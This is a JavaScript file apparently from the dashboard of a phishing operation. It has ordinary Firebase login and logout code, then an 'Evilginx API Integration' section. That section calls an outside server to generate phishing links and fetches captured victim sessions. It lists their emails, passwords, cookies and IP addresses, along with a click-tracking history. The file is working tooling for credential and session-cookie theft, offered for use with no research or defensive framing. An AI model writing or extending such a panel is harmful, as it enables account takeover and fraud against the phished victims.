console.log("✅ script.js loaded successfully");

// Ensure Firebase is loaded
document.addEventListener("DOMContentLoaded", function () {
  if (typeof firebase === "undefined") {
    console.error("❌ Firebase is NOT defined. Check firebase-config.js.");
    return;
  }
  checkAuthStatus();
  
  // Attach login event (if on login page)
  const loginBtn = document.getElementById("loginBtn");
  if (loginBtn) {
    loginBtn.addEventListener("click", login);
  }
});

// Check authentication status and redirect if needed
function checkAuthStatus() {
  firebase.auth().onAuthStateChanged(function (user) {
    if (user) {
      console.log("✅ User logged in:", user.email);
      // If on login page and already logged in, redirect to dashboard
      if (window.location.pathname.endsWith("index.html") || window.location.pathname === "/") {
        window.location.href = "dashboard.html";
      }
    } else {
      console.log("❌ User not logged in.");
      // If on dashboard page and not logged in, redirect to login
      if (window.location.pathname.endsWith("dashboard.html")) {
        window.location.href = "index.html";
      }
    }
  });
}

// Login function
function login() {
  const email = document.getElementById("email").value;
  const password = document.getElementById("password").value;

  if (!email || !password) {
    alert("Please enter email and password.");
    return;
  }

  firebase.auth().signInWithEmailAndPassword(email, password)
    .then(function (userCredential) {
      console.log("✅ Login successful:", userCredential.user.email);
      window.location.href = "dashboard.html";
    })
    .catch(function (error) {
      console.error("❌ Login failed:", error.message);
      document.getElementById("loginError").innerText = error.message;
    });
}

// Logout function
function logout() {
  firebase.auth().signOut().then(function () {
    console.log("✅ User logged out.");
    window.location.href = "index.html";
  }).catch(function (error) {
    console.error("❌ Logout failed:", error.message);
  });
}

// --------------------- Evilginx API Integration ---------------------
// Update this constant with your Evilginx domain name (with port 5000)
const EVILGINX_SERVER = "http://tecan.com.co:5000";

// Generate Evilginx Phishing Link
function generateLink() {
  fetch(`${EVILGINX_SERVER}/generate_link`)
    .then(function (response) { return response.json(); })
    .then(function (data) {
      if (data.link) {
        console.log("✅ Link generated:", data.link);
        alert("Phishing Link: " + data.link);
      } else {
        console.error("❌ Failed to generate link:", data);
        alert("Failed to generate link.");
      }
    })
    .catch(function (error) {
      console.error("❌ Error generating link:", error);
      alert("Error generating link. Check Evilginx server.");
    });
}

// Fetch and display captured sessions
function viewCapturedSessions() {
  fetch(`${EVILGINX_SERVER}/captured_sessions`)
    .then(function (response) { return response.json(); })
    .then(function (data) {
      let tableBody = document.getElementById("capturedSessions");
      tableBody.innerHTML = ""; // Clear previous data
      data.forEach(function (session) {
        let row = `<tr>
            <td>${session.email}</td>
            <td>${session.password}</td>
            <td>${session.cookies}</td>
            <td>${session.ip}</td>
          </tr>`;
        tableBody.innerHTML += row;
      });
      console.log("✅ Captured sessions loaded.");
    })
    .catch(function (error) {
      console.error("❌ Error fetching captured sessions:", error);
      alert("Error fetching captured sessions.");
    });
}

// Fetch and display generated links history
function viewGeneratedLinks() {
  fetch(`${EVILGINX_SERVER}/generated_links`)
    .then(function (response) { return response.json(); })
    .then(function (data) {
      let tableBody = document.getElementById("generatedLinks");
      tableBody.innerHTML = ""; // Clear previous data
      data.forEach(function (link) {
        let row = `<tr>
            <td>${link.url}</td>
            <td>${link.clicked_location}</td>
            <td>${link.ip}</td>
          </tr>`;
        tableBody.innerHTML += row;
      });
      console.log("✅ Generated links history loaded.");
    })
    .catch(function (error) {
      console.error("❌ Error fetching generated links:", error);
      alert("Error fetching generated links.");
    });
}
